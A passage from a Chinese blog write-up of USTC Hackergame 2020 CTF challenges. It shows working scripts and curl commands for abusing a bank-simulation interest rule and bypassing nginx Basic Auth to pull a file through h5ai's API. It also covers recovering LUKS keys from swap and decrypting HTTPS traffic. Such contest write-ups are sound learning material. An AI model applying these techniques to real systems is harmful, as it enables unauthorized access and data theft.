Shader）是片段着色器、可以算颜色，然后就开始硬上了。在花了半个小时盲目乱改 VS 的参数后，成功让「犹抱琵琶半遮面」的 flag 露出了右上角：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/16.jpg\" width=\"1280\" height=\"571\" class=\"lazy post-img\"></p>\n<p>凭借着漏出来的部分，我成功认出了 <code>l</code>、<code>Graphic</code>、<code>Happy</code>、<code>(233);</code>。剩下的就要靠猜了，我猜过的 flag 有：</p>\n<ul>\n<li>\n<code>flag{GraphicHappy(223);}</code> （整体长度都不对）</li>\n<li>\n<code>flag{GraphicsHappy(223);}</code> （ <code>c</code> 和 <code>H</code> 之间还有个类似 <code>c</code> 的字母、那就是 <code>s</code> 了，不过还是不够长）</li>\n<li>\n<code>flag{gl_GraphicsHappy(223);}</code> （OpenGL 里不少 <code>gl_</code> 前缀，加上认出来一个 <code>l</code>，试试看）</li>\n<li>\n<code>flag{glGraphicsHappy(223);}</code> （<code>l</code> 和 <code>G</code> 之间的距离没那么长，终于猜对了）</li>\n</ul>\n<blockquote><p>这道题的正确解法是利用未被使用的向量 <code>Normal</code>。苏卡卡虽然有注意到 Normal 未被使用过，但是由于完全不会 OpenGL、并不知道怎么添加向量。</p></blockquote>\n<p>这种解法没什么好自豪的，你看这只大尾巴狐狸就是逊啦。</p>\n<h2>来自未来的信笺</h2>\n<blockquote>\n<p>你收到了一封邮件。没有标题，奇奇怪怪的发件人，和一份奇怪的附件。日期显示的是 3020 年 10 月 31 日。</p>\n<p>“Send from Arctic.” 正文就只有这一句话。</p>\n<p>「谁搞的恶作剧啊……话说这竟然没有被垃圾邮件过滤器过滤掉？」你一边嘟囔着一边解压了附件——只看到一堆二维码图片。</p>\n<p>看起来有点意思。你不禁想试试，能否从其中得到什么有意义的东西。</p>\n</blockquote>\n<p>谁会在 1000 年以后从北极给你发一封电子邮件？那当然是 <a href=\"https://archiveprogram.github.com/\">GitHub Archive Program</a> 啦 —— 今年年初，GitHub 将现存的活跃开源项目全部以二维码的形式刻录在胶片上、埋进了北极世界档案馆（AWA，位于斯瓦尔巴群岛一个位于北极冻土之下的废弃煤矿中，和 Global Seed Vault 仅一英里之遥）中。为了做这道题，让我们读一读 GitHub Archive Program 为「后人」提供的指南：</p>\n<ul>\n<li><p>「<a href=\"https://github.com/github/archive-program/blob/master/GUIDE.md\">A Guide To the GitHub Code Vault</a>」</p></li>\n<li><p>「<a href=\"https://github.com/github/archive-program/blob/master/GUIDE_zh.md\">GitHub Code Vault 指南（简体中文）</a>」</p></li>\n</ul>\n<p>这里摘抄简体中文版指南的一部分内容：</p>\n<blockquote>\n<p>每个二维码由一个个白色或黑色小方块组成，该等小方块几乎占据胶片的整个帧。 使用二维码的原因在于，其比人类可读的文本更紧凑而可靠。 二维码可解码为二进制数据，即一系列 1 和 0。</p>\n<p>……</p>\n<p>我们可将 TAR 文件嵌套进 TAR 文件，就像在容器中装入另一容器，而这正是大部分存档数据的存储方式。 无论哪个仓库，其外层 TAR 文件都将至少包含如下内容：</p>\n<ul>\n<li>一个名为 META 的未压缩元数据文件，其包含仓库名称、帐户名、说明、语言、星数、复刻数</li>\n<li>一个名为 COMMITS 的压缩文件（如下所述），包含该仓库有史以来的更改记录</li>\n<li>一个名为 repo.tar.xz 的文件，是包含实际仓库内容的压缩 TAR 文件</li>\n</ul>\n<p>其它诸如 wiki、gh-page、issue 和 pull request 等元数据也可能包含在不同压缩文件中。</p>\n</blockquote>\n<p>现在我们知道了这些二维码是什么、二维码们中存储了什么数据、数据的格式，接下来就该写一个脚本把所有二维码全部解析出来了：</p>\n<pre><code class=\"hljs python\"><span class=\"hljs-keyword\">import</span> zxing<span class=\"hljs-keyword\">import</span> osreader = zxing.BarCodeReader()<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">parseQRCode</span>(<span class=\"hljs-params\">img_path</span>):</span>    barcode = reader.decode(img_path).encode().decode(<span class=\"hljs-string\">'ascii'</span>)    <span class=\"hljs-keyword\">try</span>:        <span class=\"hljs-keyword\">return</span> barcode.raw    <span class=\"hljs-keyword\">except</span>:        <span class=\"hljs-built_in\">print</span>(img_path, barcode)        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-string\">\"\"</span><span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">listDirImages</span>(<span class=\"hljs-params\">folder</span>):</span>    imgs = []    <span class=\"hljs-keyword\">for</span> img_path <span class=\"hljs-keyword\">in</span> os.listdir(folder):        ext = os.path.splitext(img_path)        <span class=\"hljs-keyword\">if</span> <span class=\"hljs-built_in\">len</span>(ext) &gt; <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> ext[<span class=\"hljs-number\">1</span>].lower() == <span class=\"hljs-string\">\".png\"</span>:            imgs.append(img_path)    imgs.sort()    <span class=\"hljs-keyword\">return</span> imgscontents = []<span class=\"hljs-keyword\">for</span> img <span class=\"hljs-keyword\">in</span> listDirImages(<span class=\"hljs-string\">\"./\"</span>):    contents.extend(parseQRCode(img))file = <span class=\"hljs-string\">\"./result.txt\"</span><span class=\"hljs-keyword\">with</span> <span class=\"hljs-built_in\">open</span>(file, <span class=\"hljs-string\">\"w\"</span>) <span class=\"hljs-keyword\">as</span> f:    <span class=\"hljs-keyword\">for</span> c <span class=\"hljs-keyword\">in</span> contents:        f.write(c)</code></pre>\n<blockquote><p>这道题对二维码解码库的选择非常关键。<code>zybar</code> 已经八年没有更新，不仅无法处理 Binary Format QRCode、而且还无法识别 00 截断；相比来说，<code>zxing</code> 库的维护非常活跃、因而更为可靠。不过即使使用 py-zxing 也有坑，很快就会看到了。</p></blockquote>\n<p>把脚本丢到二维码目录下执行，跑完了打开 <code>result.txt</code>，看到了 <code>META</code>（一个 <code>openlug/django-common</code> 的 GitHub RESTful API 返回值）、<code>COMMITS</code>，甚至还看到了一条 commit message「There’s no flag in META and COMMITS!」。但是到了 <code>repo.tar.xz</code> 却让我伤破脑筋：zlib 的文件头本应该是 <code>FD 37 7A 58</code>，结果却看到了 <code>EF BF BD 37 7A 58</code>，解压软件一个都认不出来。</p>\n<p>这是啥玩意？遇事不决问 Google，结果找到了这个：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/20.png\" width=\"829\" height=\"601\" class=\"lazy post-img\"></p>\n<blockquote><p>[狐狐脏话删除]</p></blockquote>\n<p>接下来就是去魔改 zxing 了。如之前所说，python-zxing 还只是个 Java zxing 的 wrapper，不得不去学了一点 Java 把 zxing 里的 UTF-8 干掉，最终重新解析了一遍二维码、拿到了正确的 <code>repo.tar.xz</code>，解压拿到了 flag。</p>\n<blockquote><p>顺便说一句，做完这道题后有点无聊，开始通过 META 反推原始仓库。原本看到 <code>openlug/nonexist</code>，以为出题人是新建了一个 Private Repo 出的题，但是又看到 <code>fork_count</code> 和 <code>network_count</code> 是 5，所以得出结论这肯定是一个 Public Repo（否则不可能有 Fork）。再根据 Star 数在 30 左右、Watch 数（在 GitHub RESTful API 中通过 <code>subscriber_count</code> 呈现）是 1、语言是 Python， 最后反推出 META 信息源自去年「被泄露的姜戈」的 <code>openlug/django-common</code>，生成 META 的方式就是 <code>curl https://api.github.com/repos/openlug/django-common</code>。结果还被组委会 diss 了，大尾巴狐狐非常不高兴。</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.0/32.png\" width=\"1067\" height=\"247\" class=\"lazy post-img\"></p>\n<h2>狗狗银行</h2>\n<blockquote><p>你能在狗狗银行成功薅到羊毛吗？</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/6.png\" width=\"1009\" height=\"593\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/7.png\" width=\"988\" height=\"581\" class=\"lazy post-img\"></p>\n<p>考虑到题目公告更新提示「本题前端计算存在浮点数导致的计算误差，数字特别极端时显示可能不正确。但后端采用大整数精确计算，只有净资产确实高于 2000 时才会给出 flag」，所以这道题的思路和 前年 USTC Hackergame 2018 的猫咪银行借助 INT64 溢出 肯定是不一样的。</p>\n<p>首先观察题目给出的条件：每天都要花 10 块钱吃饭；信用卡利率 0.5%、并且一旦欠款每天利息至少是 10 块钱；储蓄卡利率 0.3%。光从字面上的数字来看似乎这道题做不出来，但是我们知道，阿里蚂蚁金服的「余额宝」产品存在「每天收益不足 1 分钱时按 1 分钱计算」的规则。狗狗银行的储蓄卡利率是否也有类似的规则呢？办一张新的「储蓄卡 3」，从「储蓄卡 1」转 166 块钱到「储蓄卡 3」，「储蓄卡 3」的日利息仍然是 0；再从「储蓄卡 1」转 1 块钱到「储蓄卡 3」使余额变成 167 块，Bingo！现在「储蓄卡 3」的日利息有 1 块钱了。<code>1 / 167</code> 算出来真实的日利率是 0.5988%，比信用卡的利率要高 0.0988%，因此我们可以从信用卡借钱然后赚利息的差价，当然还要考虑到每天至少要净赚 10 块的饭钱、以及信用卡的复利（利滚利）。</p>\n<p>接下来就是用脚本连续开一万张卡试图一天拿到 flag，然后，三台备用服务器（一个 IP 上三个端口、三个 Docker）全部 RST 了。。。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/13.png\" width=\"782\" height=\"905\" class=\"lazy post-img\"></p>\n<p>之后，题目新增了一条公告：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/15.png\" width=\"690\" height=\"94\" class=\"lazy post-img\"></p>\n<p>苏卡卡才不是故意的呢（摇尾巴），<del>苏卡卡只是坏，一天赚 1000 不香嘛</del>；虽然有了 1000 张卡的限制，获取 flag 还是轻而易举的：</p>\n<pre><code class=\"hljs js\">(<span class=\"hljs-keyword\">async</span> () =&gt; {  <span class=\"hljs-keyword\">const</span> commonFetchOpt = {    <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'POST'</span>, <span class=\"hljs-attr\">mode</span>: <span class=\"hljs-string\">'cors'</span>, <span class=\"hljs-attr\">credentials</span>: <span class=\"hljs-string\">'include'</span>,    <span class=\"hljs-attr\">headers</span>: {      <span class=\"hljs-attr\">Authorization</span>: <span class=\"hljs-string\">'Bearer [选手 Token]'</span>,      <span class=\"hljs-string\">'Content-Type'</span>: <span class=\"hljs-string\">'application/json; charset=utf-8'</span>    }  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{'credit'|'debit'}</span> <span class=\"hljs-variable\">type</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">createCard</span>(<span class=\"hljs-params\">type = <span class=\"hljs-string\">'debit'</span></span>) </span>{    <span class=\"hljs-keyword\">return</span> fetch(<span class=\"hljs-string\">'/api/create'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ type }),      ...commonFetchOpt    });  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">from</span></span></span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">to</span></span></span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">amount</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">transfer</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">from</span>, to, amount</span>) </span>{    <span class=\"hljs-keyword\">return</span> fetch(<span class=\"hljs-string\">'/api/transfer'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ amount, <span class=\"hljs-attr\">dst</span>: to, <span class=\"hljs-attr\">src</span>: <span class=\"hljs-keyword\">from</span> }),      ...commonFetchOpt    });  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">account</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-keyword\">async</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">eatAndEndTheDay</span>(<span class=\"hljs-params\">account</span>) </span>{    <span class=\"hljs-keyword\">await</span> fetch(<span class=\"hljs-string\">'/api/eat'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ account }),      ...commonFetchOpt    });  }  <span class=\"hljs-keyword\">try</span> {    <span class=\"hljs-comment\">// 开一张信用卡</span>    <span class=\"hljs-keyword\">await</span> createCard(<span class=\"hljs-string\">'credit'</span>);    <span class=\"hljs-comment\">// 开 999 张储蓄卡，并给每张新开的储蓄卡转 167 块钱</span>    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">3</span>; i &lt; <span class=\"hljs-number\">1002</span>; i++) {      <span class=\"hljs-keyword\">await</span> createCard(<span class=\"hljs-string\">'debit'</span>);      <span class=\"hljs-keyword\">await</span> transfer(<span class=\"hljs-number\">2</span>, i, <span class=\"hljs-number\">167</span>);    }    <span class=\"hljs-comment\">// 用储蓄卡 1 的初始资金 1000 度过 14 天</span>    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">0</span>; i &lt; <span class=\"hljs-number\">14</span>; i++) {      <span class=\"hljs-keyword\">await</span> eatAndEndTheDay(<span class=\"hljs-number\">1</span>);    }    <span class=\"hljs-comment\">// 14 天肯定能赚够 1000 块钱了，该获取 flag 了</span>    <span class=\"hljs-keyword\">const</span> req = <span class=\"hljs-keyword\">await</span> fetch(<span class=\"hljs-string\">'/api/user'</span>, { ...commonFetchOpt, <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'GET'</span> });    <span class=\"hljs-keyword\">const</span> resp = <span class=\"hljs-keyword\">await</span> req.json();    <span class=\"hljs-built_in\">console</span>.log(resp.flag);  } <span class=\"hljs-keyword\">catch</span> (e) {    <span class=\"hljs-built_in\">console</span>.error(e);  }})();</code></pre>\n<h2>超基础的数理模拟器</h2>\n<blockquote><p>……<br>我们在 Hackergame 2020 的网站上部署了一项超基础的数理模拟器。 作为一名数理基础扎实的同学，你一定能够轻松通过模拟器的测试吧。</p></blockquote>\n<p>打开题目后发现要做 400 道定积分，而且答案还要取小数点后六位：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.8/29.png\" width=\"1497\" height=\"412\" class=\"lazy post-img\"></p>\n<p>这道题没有取巧的办法，只有老老实实把 400 道定积分全部做完…..吧？</p>\n<p>这么长的定积分谁手算啊，当然是要用 MatLab 来算啦！徒手转换 LaTex 到 MathLab 太麻烦了，写个脚本来做吧：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/27.png\" width=\"1150\" height=\"420\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/28.png\" width=\"1146\" height=\"539\" class=\"lazy post-img\"></p>\n<p>UserScript 在 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-js\">这里</a>，好孩子千万不要学习这种方法来解析 LaTex。</p>\n<h2>室友的加密硬盘</h2>\n<blockquote>\n<p>「我的家目录是 512 位 AES 加密的，就算电脑给别人我的秘密也不会泄漏……」你的室友在借你看他装着 Linux 的新电脑时这么说道。你不信，于是偷偷从 U 盘启动，拷出了他硬盘的一部分内容。</p>\n<p><a href=\"https://archive.org/details/roommates_disk_part.img\">打开/下载题目</a> （Hosted at Internet Archive）</p>\n</blockquote>\n<p>苏卡卡一开始试图把镜像直接挂载在虚拟机上，结果无法启动系统；于是先起了一个 Linux 虚拟机、在 Linux 下将 img 转换为 vmdk 再添加到虚拟机中，结果依然提示「未找到已安装的操作系统或操作系统安装器」。</p>\n<blockquote><p>中国民航于 1992 年在《中国民用航空局关于确保飞行安全的命令》文件中提出了 54 个字「八该一反对」，其中最重要的就是「反对盲目蛮干」</p></blockquote>\n<p>既然通过 img 文件直接启动没有成功，不如先看看这个 img 文件都有什么：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/18.png\" width=\"824\" height=\"864\" class=\"lazy post-img\"></p>\n<blockquote><p>不要在意这个 Ubuntu Kylin，最近狐狐在虚拟机里各种体验各种「国产 Linux 发行版」，虚拟机里正好有 Ubuntu Kylin 所以拿来用的。</p></blockquote>\n<p>由于之前阅读过一些通过内存转储破解全盘加密的文章，所以便去下载了 <a href=\"https://sourceforge.net/projects/findaes/\">findaes</a> 的源码，编译的同时再去重读之前的几篇文章获取思路。看到几篇文章中都是用 findaes 直接读取 raw 的内存转储，于是决定直接用 findaes 爆破硬盘映像文件。首先把 img 用 7z 解压出来，然后一个一个分区映像跑：</p>\n<pre><code class=\"hljs bash\">$ ./findaes /path/to/img1.raw</code></pre>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/19.jpg\" width=\"867\" height=\"480\" class=\"lazy post-img\"></p>\n<p>根据题干「我的家目录是 512 位 AES 加密的」，但是 findaes 找到的都是 AES-256，所以需要从中筛选出一对 offset 相差为 256bit 的 key 进行拼接，因此还需要注意一点，由于 Intel x86_64 的 little-endian、拼接 key 时需要倒序拼接。</p>\n<blockquote><p>其实这一点我还是比较熟悉的，安装 Hackintosh 时注入十六进制的设备属性时需要互换 bit 也是因为 little-endian。</p></blockquote>\n<p>剩下的就是一对一对 key 的用 <code>sudo cryptsetup luksAddKey --master-key-file</code> 试过去，直到成功解密为止。最后用 swap 里的最后一对 key 成功解密了分区并拿到了 flag <code>flag{lets_do_A_c01d_b00t_next_time}</code> （下次试试冷启动吧！），直到看到 flag 才明白本题的思路是 Linux 休眠后会把内存写入 swap 分区中（macOS 则是写入硬盘上的 <code>sleepimage</code> 文件中），因此和之前读过的从内存转储破解全盘加密的思路是完全一致的。最后再给大家推荐 Red Hat 知识库的一篇文章「<a href=\"https://access.redhat.com/solutions/1543373\">How to recover lost LUKS key or passphrase</a>」。</p>\n<h2>超简易的网盘服务器</h2>\n<blockquote>\n<p>…… 小 C 开始思考技术方案：“听说 h5ai 搭建云盘的方案是不错的 … 使用 Basic Auth 可以做访问控制，可以保护<a href=\"http://202.38.93.111:10120/\">根目录</a>下的文件不被非法的访问 … 等等，有一些文件是可以被分享的，需要一个 <a href=\"http://202.38.93.111:10120/Public\">/Public</a> 目录来共享文件！”</p>\n<p>三分钟后，小 C 同学完成了网盘的搭建。他想：“空着总不好，先得在云盘上放点东西！”。犹豫片刻，他掏出了自己珍藏了三个月的 flag 并上传到了云盘的<a href=\"http://202.38.93.111:10120/\">根目录</a>。</p>\n</blockquote>\n<p>这道题我好像是第五个还是第六个解出来的。这道题很多人没做出来还是有点令我惊讶的。</p>\n<p>直接访问「根目录」会提示 401 需要 HTTP Basic Authentication，聪明的 小 C 肯定不会把密码直接暴露出来的。访问 <code>/Public </code>目录却发现了 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-h5ai_nginx-conf\"><code>dockerfile</code></a> 和 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-h5ai_dockerfile\"><code>nginx.conf</code></a> 文件。从 dockerfile 中我们可以知道小 C 是怎么搭建的服务，而 <code>nginx.conf</code> 更值得我们关心（已省去无关紧要的部分）：</p>\n<pre><code class=\"hljs nginx\"><span class=\"hljs-attribute\">index</span> index.php index.html /_h5ai/public/index.php;<span class=\"hljs-comment\"># 根目录是私有目录，使用 basic auth 进行认证，只有我（超极致的小 C)自己可以访问</span><span class=\"hljs-attribute\">location</span> / {    <span class=\"hljs-attribute\">auth_basic</span> <span class=\"hljs-string\">\"easy h5ai. For visitors, please refer to public directory at `/Public!`\"</span>;    <span class=\"hljs-attribute\">auth_basic_user_file</span> /etc/nginx/conf.d/htpasswd;}<span class=\"hljs-comment\"># Public 目录是公开的，任何人都可以访问，便于我给大家分享文件</span><span class=\"hljs-attribute\">location</span> /Public {    <span class=\"hljs-attribute\">allow</span> all;    <span class=\"hljs-attribute\">index</span> /Public/_h5ai/public/index.php;}<span class=\"hljs-comment\"># PHP 的 fastcgi 配置，将请求转发给 php-fpm</span><span class=\"hljs-attribute\">location</span> <span class=\"hljs-regexp\">~ \\.php$</span> {         <span class=\"hljs-attribute\">fastcgi_pass</span>   <span class=\"hljs-number\">127.0.0.1:9000</span>;         <span class=\"hljs-attribute\">fastcgi_index</span>  index.php;         <span class=\"hljs-attribute\">fastcgi_param</span>  SCRIPT_FILENAME  $document_root$fastcgi_script_name;         <span class=\"hljs-attribute\">include</span>        fastcgi_params;}</code></pre>\n<p>由于 Nginx 配置文件不是连续匹配，因此访问 <code>.php</code> 结尾的路径是不会触发 401 HTTP Basic Auth 的（应该没有人会天真地试图获取 <code>/etc/nginx/conf.d/htpassword</code> 吧？）。既然如此，我们为什么不直接访问 <code>h5ai</code> 的 <code>index.php</code> 呢？首先让我们请求一下 <code>/Public</code> 目录下的 h5ai 后台页面 <code>/Public/_h5ai/public/index.php</code>：</p>\n<pre><code class=\"hljs bash\">curl http://202.38.93.111:10120/Public/_h5ai/public/index.php -IHTTP/1.1 200 OK</code></pre>\n<p>那么「根目录」下的 <code>/_h5ai/public/index.php</code> 呢？</p>\n<pre><code class=\"hljs bash\">curl http://202.38.93.111:10120/_h5ai/public/index.php -IHTTP/1.1 200 OK</code></pre>\n<p>不出所料，直接访问 <code>index.php</code> 也会返回 200 OK，而不是 401。</p>\n<p>虽然直接访问 <code>/_h5ai/public/index.php</code> 不会返回 401，但是 GET 这个路径默认是返回 h5ai 的后台调试页面。由于 h5ai 是开源的、我们可以前往 <a href=\"https://github.com/lrsjng/h5ai\">h5ai 的 GitHub</a> 对其代码进行审计，发现 <a href=\"https://github.com/lrsjng/h5ai/blob/master/src/_h5ai/private/php/core/class-api.php\">h5ai 提供了一系列 API</a>，可以通过 POST 请求列出目录内容和下载文件。首先试试能不能用 API 列出根目录下的文件内容：</p>\n<pre><code class=\"hljs bash\">$ curl <span class=\"hljs-string\">'http://202.38.93.111:10120/_h5ai/public/index.php'</span> -H <span class=\"hljs-string\">'Content-Type: application/json;charset=UTF-8'</span> --data-binary <span class=\"hljs-string\">'{\"action\":\"get\",\"items\":{\"href\":\"/\",\"what\":1}}'</span> | jq{  <span class=\"hljs-string\">\"items\"</span>: [    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603986831000,      <span class=\"hljs-string\">\"size\"</span>: 789419,      <span class=\"hljs-string\">\"managed\"</span>: <span class=\"hljs-literal\">true</span>,      <span class=\"hljs-string\">\"fetched\"</span>: <span class=\"hljs-literal\">true</span>    },    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/Public/\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603986830000,      <span class=\"hljs-string\">\"size\"</span>: 396458,      <span class=\"hljs-string\">\"managed\"</span>: <span class=\"hljs-literal\">false</span>,      <span class=\"hljs-string\">\"fetched\"</span>: <span class=\"hljs-literal\">false</span>    },    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/flag.txt\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603489315000,      <span class=\"hljs-string\">\"size\"</span>: 24    }  ]}</code></pre>\n<p>诶嘿嘿，我们看到 <code>/flag.txt</code> 啦！接下来就是用 API 下载 <code>flag.txt</code> 文件了：</p>\n<pre><code class=\"hljs bash\">$ curl <span class=\"hljs-string\">'http://202.38.93.111:10120/_h5ai/public/index.php'</span> -H <span class=\"hljs-string\">'Content-Type: application/x-www-form-urlencoded'</span> --data-raw <span class=\"hljs-string\">'action=download&amp;as=flag.txt.tar&amp;type=php-tar&amp;baseHref=/&amp;hrefs[0]=/flag.txt'</span> -o flag.txt.tar$ tar xzf flag.txt.tar$ cat flag.txt <span class=\"hljs-comment\"># Flag 到手啦</span></code></pre>\n<h2>超安全的代理服务器</h2>\n<blockquote>\n<p>在 2039 年，爆发了一场史无前例的疫情。为了便于在各地的同学访问某知名大学「裤子大」的网站进行「每日健康打卡」，小 C 同学为大家提供了这样一个代理服务。曾经信息安全专业出身的小 C 决定把这个代理设计成最安全的代理。</p>\n<p><strong>提示：浏览器可能会提示该 TLS 证书无效，与本题解法无关，信任即可。</strong></p>\n</blockquote>\n<p>「浏览器可能会提示该 TLS 证书无效」这句话至关重要。想想看为什么别的题都是通过 HTTP 访问的、唯独这道题要用 HTTPS？什么东西需要 HTTPS 才能工作、在 HTTP 下不工作呢？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/9.png\" width=\"1165\" height=\"294\" class=\"lazy post-img\"></p>\n<p>虽然 HTTP/2 本身不要求 TLS 实现（例如 H2C、HTTP/2 ClearText）、并且有通过 HTTP/1.1 升级到 HTTP/2 的协商方法（参见 <a href=\"https://blog.skk.moe/post/http3-alt-svc/#HTTP-2-%E7%9A%84%E5%8D%8F%E5%95%86%E6%96%B9%E5%BC%8F\">我之前的文章「HTTP/3：HTTP Alternative Services 作为协商方式」中的「HTTP/2 的协商方式」章节</a> ），但是所有支持 HTTP/2 的浏览器都要求 HTTP/2 必须通过 TLS 传输、并在 Client Hello 中通过 ALPN Protocol 进行协商。扯远了，看看题目。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/8.png\" width=\"750\" height=\"400\" class=\"lazy post-img\"></p>\n<p>「我们已经向您 <strong>推送（PUSH）</strong> 了最新的 <strong>Secret</strong> ，但是你可能无法直接看到它」。现在我们知道了，这道题和 HTTP/2 Server Push 有关。解码 HTTP/2 帧最好的方法自然是使用 Wireshark。首先我们要让 Wireshark 能够解密 HTTPS 内容，最简单的方法是使用 <code>SSLKEYLOGFILE</code> 环境变量。</p>\n<blockquote><p>警告！使用 <code>SSLKEYLOGFILE</code> 环境变量非常危险，任何获取该变量的软件都可以随意解密你的 HTTPS 流量！因此，务必仅针对某一需要解密流量的软件、在某一次性 Session 下设置该环境变量！</p></blockquote>\n<p>打开 Chrome，在 <code>chrome://version/</code> 中查看可执行文件路径：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/10.png\" width=\"1196\" height=\"270\" class=\"lazy post-img\"></p>\n<p>然后在终端中通过预设环境变量直接启动 Chrome：</p>\n<pre><code class=\"hljs bash\">SSLKEYLOGFILE=<span class=\"hljs-string\">\"/path/to/ssllog.txt\"</span> <span class=\"hljs-string\">\"/Applications/Google Chrome.app/Contents/MacOS/Google Chrome\"</span></code></pre>\n<p>启动 Wireshark 偏好设置中找到 Protocol - TLS、配置 (Pre)-Master-Secret log filename：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/11.png\" width=\"687\" height=\"514\" class=\"lazy post-img\"></p>\n<p>现在，再通过启动的 Chrome 访问「Smart Proxy!」，可以看到 Wireshark 完整解密了 Chrome 的所有 HTTPS 流量。在 Wireshark 中使用下述过滤器找出本题的流量：</p>\n<pre><code class=\"hljs plaintext\">ip.addr == 146.56.228.227</code></pre>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/12.png\" width=\"1371\" height=\"279\" class=\"lazy post-img\"></p>\n<p>在过滤后的流量中我们很快就可以找到 PUSH_PROMISE 帧、告诉了我们如何获得 secret 和第一个 flag：<code>GET /ebe087a0-68e5-4280-b605-b98b89488e1e</code>。</p>\n<p>获得第一个 flag 后，我们可以在终端中 Ctrl + C 关闭 Chrome。之后从 Dock、桌面、Finder、Spotlight 等方法「正常启动」Chrome 是不会再将 TLS 握手的信息输出到 SSLKEYLOGFILE 的。</p>\n<h2>尾声</h2>\n<p>今年的 USTC Hackergame 对我来说运气的成分远高于能力的成分，不少题目都是侥幸做出来的，而且对 <code>binary</code> 和 <code>math</code> 一窍不通的我这两类题几乎一道题都没做出来；比赛期间甚至收到了主办方邀请提交「非官方题解」，受宠若惊（狐狐暗自高兴）；最后拿到了 3250 分，排名侥幸挤进了前 50、与真正的 CS 大佬和 CTF 师傅们在榜上合影，瑟瑟发抖（非常害怕）。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.9/31.png\" width=\"1109\" height=\"135\" class=\"lazy post-img\"></p>\n<p>没有对比就没有伤害，相比 <a href=\"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/\">两周前 Bilibili 的「1024  程序员节 CTF」</a>，USTC Hackergame 不论是在难度梯度分布、题目水平、趣味性、活动整体质量上都远高一个层次。引用组委会成员「Zihan Zheng」在知乎「<a href=\"https://www.zhihu.com/question/351947330/answer/866177844\">参加中国科学技术大学第六届信息安全大赛（Hackergame 2019）是怎样一种体验？</a>」提问中的回答：</p>\n<blockquote><p>我们举办的 Hackergame 的初衷就是对新人友好，增加趣味性，强调教育意义。我看到有些同学反馈说题目偏简单、逆向题偏少等等，我想强调，我们这个比赛虽然是提交 flag 的形式，但<strong>不是 CTF 比赛，不会与国内外的 CTF 比赛对标</strong>。我们会把这个特色坚持下去，希望大家不要从经验丰富的 CTF 选手视角来评价我们的比赛。</p></blockquote>\n<p>如果说 Hackergame 的初衷是「对新人友好，增加趣味性，强调教育意义」，IMHO 不论是 <a href=\"https://blog.skk.moe/post/hackergame-2019-write-up/\">往届</a> 